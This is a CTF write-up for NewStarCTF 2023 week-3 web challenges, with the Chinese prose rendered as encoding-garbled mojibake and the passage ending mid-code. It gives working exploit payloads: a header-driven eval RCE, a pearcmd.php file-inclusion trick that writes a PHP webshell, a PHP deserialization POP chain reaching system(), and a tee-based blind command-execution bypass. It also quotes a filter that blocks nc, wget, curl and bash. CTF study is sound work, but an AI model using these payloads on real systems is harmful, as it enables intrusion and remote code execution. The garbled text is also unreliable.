<p>â€‹		ä¸€èˆ¬æ¥è¯´å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶æˆ–è‡ªå·±ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬åï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä½†åƒä¸Šé¢è¿™æ ·<code>/[^\W]+\((?R)?\)/</code>çš„æ­£åˆ™è¿‡æ»¤æ–¹å¼ï¼Œæˆ‘ä»¬ä¸èƒ½è¾“å…¥ä»»ä½•å‚æ•°ï¼Œè¿™æ ·æƒ³ç»•è¿‡çš„è¯ä¸€ä¸ªå¤§çš„æ€è·¯å°±æ˜¯é€šè¿‡å¥—å¨ƒï¼Œé€šè¿‡è®©ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·a(b(c()));ï¼Œæœ€ç»ˆè¾¾åˆ°rceçš„æ•ˆæœï¼Œä¸‹é¢åˆ—å‡ ç§ç»•è¿‡æ–¹æ³•ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œä¹‹åæä¸€ä¸ªä¸“é—¨çš„æ–‡ç« å»è®°å½•ä¸€ä¸‹ï¼Œè¿™é‡Œç›´æ¥æ¬å‡ºç­”æ¡ˆäº†</p>
<p>è¿™é‡Œæ˜¯GPTå¯¹ä¸Šè¿°æ­£åˆ™çš„è§£æ</p>
<pre><code class="hljs plaintext">ä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼æ˜¯ `/[^\W]+\((?R)?\)/`ï¼Œè®©æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥è§£é‡Šå®ƒï¼š

1. `/`ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„èµ·å§‹æ ‡è®°ã€‚

2. `[^\W]+`ï¼šè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ç±»ï¼Œè¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªéå­—æ¯éæ•°å­—çš„å­—ç¬¦ã€‚`[^\W]` æ˜¯ `\w` çš„å¦å®šï¼Œ`\w` åŒ…æ‹¬å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œå› æ­¤ `[^\W]` åŒ¹é…é™¤å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ã€‚`+` è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªè¿™æ ·çš„å­—ç¬¦ã€‚

3. `\(`ï¼šåŒ¹é…å·¦æ‹¬å· `(` å­—ç¬¦ã€‚æ‹¬å·é€šå¸¸ç”¨äºå‡½æ•°è°ƒç”¨æˆ–åˆ†ç»„ã€‚

4. `(?R)?`ï¼šè¿™æ˜¯ä¸€ä¸ªé€’å½’å­æ¨¡å¼ï¼Œ`?` è¡¨ç¤ºå…¶å‰é¢çš„å­æ¨¡å¼ï¼ˆ`(?R)`ï¼‰æ˜¯å¯é€‰çš„ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥é›¶æ¬¡æˆ–å¤šæ¬¡é‡å¤æ•´ä¸ªæ¨¡å¼ã€‚

5. `\)`ï¼šåŒ¹é…å³æ‹¬å· `)` å­—ç¬¦ã€‚

ç»¼åˆæ¥çœ‹ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç›®çš„æ˜¯åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªéå­—æ¯éæ•°å­—å­—ç¬¦ï¼Œç„¶åç´§æ¥ç€ä¸€ä¸ªå·¦æ‹¬å·ï¼Œä¹‹åæ˜¯å¯é€‰çš„é€’å½’å­æ¨¡å¼ï¼Œæœ€åæ˜¯å³æ‹¬å·ã€‚è¿™çœ‹èµ·æ¥æ˜¯ä¸€ç§è¯•å›¾åŒ¹é…å‡½æ•°è°ƒç”¨çš„æ¨¡å¼ï¼Œä½†å®ƒä½¿ç”¨é€’å½’å­æ¨¡å¼çš„æ–¹å¼å¯èƒ½å¹¶ä¸æ˜¯æœ€å¥½çš„æ–¹å¼æ¥å¤„ç†å‡½æ•°åµŒå¥—ã€‚</code></pre>
<p>![image-20231015225038371](NewStarCTF 2023/image-20231015225038371.png)</p>
<p>ä¼ å…¥ä¸Šè¿°payloadæ‹¿åˆ°flag</p>
<pre><code class="hljs http">?star=eval(pos(array_reverse(getallheaders())));
<span class="hljs-attribute">X-Forwarder-Proto</span><span class="hljs-punctuation">: </span>system('cat /f*');</code></pre>
<h2 id="week3web-include">WEEK3|WEB-Include ğŸ</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {
        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];
        
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/flag|log|session|filter|input|data/i'</span>, <span class="hljs-variable">$file</span>)) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!'</span>);
        }
        
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">".php"</span>);
        <span class="hljs-comment"># Something in phpinfo.php!</span>
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
    }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>çœ‹åˆ°ä»£ç ä¹‹åæ„Ÿè§‰ä¼¼æ›¾ç›¸è¯†ï¼Œä½†å´å¿˜è®°äº†ï¼Œä¸è¿‡è¿™é‡Œæç¤ºæˆ‘ä»¬çœ‹ä¸€ä¸‹phpinfo.phpé¡µé¢ï¼Œé‚£æˆ‘ä»¬å°±çœ‹çœ‹</p>
<p>![image-20231021161355406](NewStarCTF 2023/image-20231021161355406.png)</p>
<p>æµè§ˆä¸€æ³¢å‘ç°è¿™é‡Œçš„flagè™½ç„¶æ˜¯é”™çš„ï¼Œä½†å´ä¹Ÿæ˜¯ä¸€ä¸ªhintï¼Œä»–æç¤ºè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹register_argc_argvè¿™ä¸ªå˜é‡ï¼Œ</p>
<p>![image-20231021161441682](NewStarCTF 2023/image-20231021161441682.png)</p>
<p>å¦‚ä¸Šå›¾æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªå˜é‡æ˜¯å¼€å¯çš„çŠ¶æ€ï¼Œé‚£åº”è¯¥å°±å¯ä»¥çŒœåˆ°è¿™é‡Œæœ‰æ¼æ´å¯ä»¥åˆ©ç”¨ï¼Œä½†æ¯•ç«Ÿæˆ‘ä¹Ÿæ˜¯èœé¸¡æ²¡å­¦è¿‡ï¼Œé‚£è¿™æ—¶å€™å°±éœ€è¦å¼ºå¤§çš„æœç´¢å¼•æ“äº†ï¼Œgoogleæœç´¢å…³é”®è¯ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ register_argc_argv=onï¼›æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ¼æ´å¤ç°çš„æ–‡ç« ï¼Œæˆ‘ä»¬æŒ‘ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å¤ç°å³å¯</p>
<p>![image-20231021161617671](NewStarCTF 2023/image-20231021161617671.png)</p>
<p>è¿™é‡Œå‘¢æˆ‘å°±å…ˆå¤ç°ä¸€æ³¢ï¼Œè‡³äºåŸç†å°±å¦èµ·æ–‡ç« å»å­¦ä¹ å§ã€‚</p>
<p>é¦–å…ˆè¿™ä¸ªæ¼æ´å«åšpearcmd.phpæ¼æ´</p>
<pre><code class="hljs plaintext">è¦åˆ©ç”¨è¿™ä¸ªpearcmd.phpéœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š

ï¼ˆ1ï¼‰.è¦å¼€å¯register_argc_argvè¿™ä¸ªé€‰é¡¹åœ¨Dockerä¸­æ˜¯è‡ªåŠ¨å¼€å¯çš„

ï¼ˆ2ï¼‰.è¦æœ‰æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨</code></pre>
<p>![image-20231021161911834](NewStarCTF 2023/image-20231021161911834.png)</p>
<p>è¿™é‡Œå€Ÿç”¨ç°æˆçš„å›¾ç‰‡æˆªå›¾äº†</p>
<p>çœ‹åˆ°config-createï¼Œå»é˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</p>
<p>æ‰€ä»¥æœ€åæ„é€ å‡ºpayloadï¼š</p>
<pre><code class="hljs http">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</code></pre>
<p>ä¸Šé¢æ˜¯å°†<!--?=phpinfo()?-->å†™åˆ°/tmp/hello.php,ç„¶åæˆ‘ä»¬å†ä½¿ç”¨æ–‡ä»¶åŒ…å«è¿›è¡ŒåŒ…å«æˆ‘ä»¬ä¹‹å‰å†™å…¥çš„æ–‡ä»¶ï¼ˆhello.phpï¼‰å°±å¯ä»¥äº†ã€‚</p>
<p>è€Œå¯¹äºæ­¤é¢˜æˆ‘ä»¬éœ€è¦æ„é€ å¦‚ä¸‹payloadï¼š</p>
<pre><code class="hljs http">/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?php @eval($_POST[1]);?&gt;+/tmp/hello.php</code></pre>
<p>è¿™é‡Œå‘¢ç›´æ¥ç”¨bpä¼ å…¥ï¼Œç”¨hackbarä¼ å…¥çš„è¯ä¼šè¢«urlç¼–ç ï¼Œå¯¼è‡´ä¼ å…¥æ–‡ä»¶æ— æ³•è§£æ</p>
<p>![image-20231021163148135](NewStarCTF 2023/image-20231021163148135.png)</p>
<p>ä½†è¿™é‡Œçš„index.phpä¹Ÿæ˜¯å¯ä»¥å»æ‰çš„</p>
<p>![image-20231021174341649](NewStarCTF 2023/image-20231021174341649.png)</p>
<p>å¦‚ä¸Šå›¾ï¼Œè¿™ä»£è¡¨æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®åå°æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–</p>
<p>![image-20231021174637310](NewStarCTF 2023/image-20231021174637310.png)</p>
<p>å¦‚ä¸Šå›¾ä»£è¡¨ä¸Šä¼ æˆåŠŸï¼Œæ¥ä¸‹æ¥å¯ä»¥èšå‰‘è¿æ¥æˆ–è€…ç›´æ¥æ‰‹åŠ¨è¯»å–ï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥ä¸Šäº†ï¼š<code>1=system('cat /flag');</code></p>
<p>![image-20231021174758295](NewStarCTF 2023/image-20231021174758295.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week3web-pop-gadget">WEEK3|WEB-POP Gadget</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-zA-Z0-9]/"</span>,<span class="hljs-variable">$this</span>-&gt;name)){
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello"</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Welcome to NewStarCTF 2023!"</span>;
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        (<span class="hljs-variable language_">$this</span>-&gt;func)();
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Good Job!"</span>;
    }

}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();
    }

}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"==GAME OVER=="</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);
    }

}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>
<span class="hljs-function">    </span>{
        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    
    }
}

@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pop'</span>]);</code></pre>
<p>ç®€å•çš„ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬ä¾æ—§è€æ€è·¯ï¼Œçœ‹æ•æ„Ÿå‡½æ•°ï¼Œæµè§ˆä¸€ä¸‹å¯ä»¥æ¸…æ™°çœ‹åˆ°whiteGodç±»ä¸­æœ‰ä¸€å¤„<code>($this-&gt;func)($this-&gt;var);</code>ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯å¯ä»¥è®©æˆ‘ä»¬è‡ªå®šä¹‰å‡½æ•°çš„æ¼æ´ç‚¹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å…¶æ‰€åœ¨unsetæ–¹æ³•ã€‚æƒ³ä¸€ä¸‹å¦‚ä½•è°ƒç”¨å³å¯</p>
<pre><code class="hljs plaintext">__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶ï¼Œ__unset()ä¼šè¢«è°ƒç”¨</code></pre>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æƒ³åŠæ³•åœ¨unsetå‡½æ•°çš„å‚æ•°ä¸­ï¼Œè®¿é—®ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§ï¼ˆä¹Ÿå°±æ˜¯ä¸å­˜åœ¨çš„ï¼‰éšåæˆ‘ä»¬å†æµè§ˆä¸€ä¸‹çœ‹åˆ°è¿™é‡Œ<code>unset($this-&gt;handle-&gt;log);</code>å¾ˆæ˜æ˜¾è¿™å°±æ˜¯æˆ‘ä»¬è¦çš„ç‚¹ï¼Œé‚£æˆ‘ä»¬åœ¨åˆ†æå¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨çš„endå‡½æ•°ã€‚</p>
<p>å†æ¬¡æµè§ˆä¼šå‘ç°Handleç±»ä¸­çš„callæ–¹æ³•å…¶ä¸­ä¼šè°ƒç”¨endå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å†æ‰¾å¦‚ä½•è°ƒç”¨callé­”æœ¯æ–¹æ³•</p>
<pre><code class="hljs plaintext">__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</code></pre>
<p>æ ¹æ®ä¸Šè¿°æ¡ä»¶æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨Superç±»ä¸­æœ‰ä¸€å¤„<code>$this-&gt;obj-&gt;getStr();</code>ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯æˆ‘ä»¬è¦çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨çœ‹å¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨invokeé­”æœ¯æ–¹æ³•</p>
<pre><code class="hljs plaintext">__invoke()ï¼Œå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</code></pre>
<p>è¿™é‡Œå¾ˆæ˜æ˜¾åœ¨Thenç±»ä¸­çš„<code>($this-&gt;func)();</code>å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæ¥ä¸‹æ¥åœ¨æ€è€ƒå¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨tostringæ–¹æ³•</p>
<pre><code class="hljs plaintext">__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</code></pre>
<p>å¾ˆæ˜æ˜¾ä¸Šè¿°ä»£ç ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯æˆ‘ä»¬è¦çš„ï¼Œåœ¨æ­¤è¡¨è¾¾å¼ä¸­nameå˜é‡æ˜¯ä¼šè¢«å½“åšå­—ç¬¦ä¸²å»æ£€æŸ¥æ˜¯å¦åŒ¹é…æ­£åˆ™çš„ï¼Œè€Œdestructå‡½æ•°ä¼šåœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸçš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ã€‚æ ¹æ®ä»¥ä¸Šæˆ‘ä»¬æœ‰å¦‚ä¸‹popé“¾</p>
<p>begin-&gt;Then-&gt;Super-&gt;Handle-&gt;CTF-&gt;WhiteGodã€‚å¦‚ä¸‹</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;

}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();
<span class="hljs-variable">$poc</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();
<span class="hljs-variable">$poc</span>-&gt;name-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();
<span class="hljs-variable">$poc</span>-&gt;name-&gt;func-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();
<span class="hljs-variable">$poc</span>-&gt;name-&gt;func-&gt;obj-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();
<span class="hljs-variable">$poc</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();
<span class="hljs-variable">$poc</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func = <span class="hljs-string">'system'</span>;
<span class="hljs-variable">$poc</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-string">'cat /flag'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p>è¿™é‡Œæ³¨æ„<code>($this-&gt;func)($this-&gt;var);</code>æˆ‘ä»¬å¦‚æœæƒ³è¦æŸ¥çœ‹æ ¹ç›®å½•å°±éœ€è¦system(â€˜ls /â€™)ï¼Œä½†åœ¨å¦‚ä¸Špopé“¾ä¸­æ˜¯æ— æ³•èµ‹å€¼ä½¿ls /ä¸¤è¾¹çš„å•å¼•å·æ­£å¸¸æ˜¾ç¤ºçš„ï¼Œè¿™é‡Œæµ‹è¯•ä¸€ç•ªå‘ç°ls /ä¸¤è¾¹å¿…é¡»å¾—å«æœ‰å•å¼•å·æˆ–è€…åŒå¼•å·æ‰è¡Œï¼Œä½†å¦‚æœ<code>"'ls /'";</code>è¿™æ ·èµ‹å€¼ä¹Ÿæ˜¯è¡Œä¸é€šçš„ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ²¡å’‹æ‡‚æ˜¯ä¸ºä»€ä¹ˆï¼Œåªæœ‰çœ‹wpæ¥è§£æƒ‘äº†ï¼Œä½†æ˜¯æˆ‘ä»¬èµ‹å€¼<code>ls${IFS}/</code>å°±å¯ä»¥æ­£å¸¸æ˜¾ç¤º</p>
<p>![image-20231022093318823](NewStarCTF 2023/image-20231022093318823.png)</p>
<p>ä¹‹åå°†varèµ‹å€¼ä¸ºcat /flagå³å¯</p>
<p>![image-20231022093355514](NewStarCTF 2023/image-20231022093355514.png)</p>
<p>æ‹¿åˆ° flag</p>
<h2 id="week3web-rce">WEEK3|WEB-R!!!C!!!E!!!</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span>, <span class="hljs-variable">$this</span>-&gt;code)){
            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-string">"alright"</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'payload'</span>])){
    <span class="hljs-comment">//wanna try?</span>
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'payload'</span>]);
}</code></pre>
<p>è¿™é“é¢˜ç›®çš„ååºåˆ—åŒ–ç‚¹å¾ˆç®€å•ï¼Œé‡ç‚¹å°±æ˜¯RCEçš„æ—¶å€™é‡‡ç”¨çš„execå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è¾“å…¥å‘½ä»¤ä¹‹åæ˜¯ä¸ä¼šå›æ˜¾æœ€ç»ˆç»“æœçš„ï¼Œå› æ­¤è€ƒå¯Ÿæˆ‘ä»¬å¯¹æ— å›æ˜¾RCEçš„æŒæ¡ã€‚</p>
<p>ä¹‹å‰ä¸ä¼šè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œå­¦ä¹ äº†ä¸€æ³¢å†æ¥çœ‹è¿™ä¸ªå‘ç°è¿˜æ˜¯ä¸èƒ½å®Œå…¨æŒæ¡ã€‚</p>
<p>æ­£å¸¸æƒ…å†µæˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellã€å¤–å¸¦æ•°æ®ã€curlè¯·æ±‚ï¼Œç­‰æ–¹æ³•ï¼Œä½†è¿™é‡Œå¯ä»¥å‘ç°è¿‡æ»¤å¾ˆå…¨ä»¥ä¸Šæƒ…å†µéƒ½ä¸èƒ½ä½¿ç”¨ï¼Œä¹‹åçœ‹äº†wpå‘ç°æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯éé¢„æœŸ</p>
<h3 id="æ–¹æ³•ä¸€lsç›´æ¥å†™å…¥è¯»å–">æ–¹æ³•ä¸€ï¼šlsç›´æ¥å†™å…¥è¯»å–</h3>
<p>è¿™é‡Œå‘¢å®˜æ–¹ä¹Ÿè¯´äº†æ˜¯ç”±äºæƒé™æ²¡ç»™æ­»ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç”¨lså†™å…¥æ ¹ç›®å½•å»è¯»å–payloadå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;
}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();
<span class="hljs-variable">$poc</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();
<span class="hljs-variable">$poc</span>-&gt;qwejaskdjnlka-&gt;code = <span class="hljs-string">"ls / | t''ee 2"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>è¿™é‡Œæ˜¯å°†ls /è¾“å‡ºçš„ç»“æœé€šè¿‡teeå†™å…¥åˆ°2ä¸­ï¼Œä¹‹åæˆ‘ä»¬ç›´æ¥urlæ‹¼æ¥2å³å¯è¯»å–åˆ°å†…å®¹                                                       ![image-20231029095629112](NewStarCTF 2023/image-20231029095629112.png)æ‰¾åˆ°flagè·¯å¾„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥è¯»å–</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;
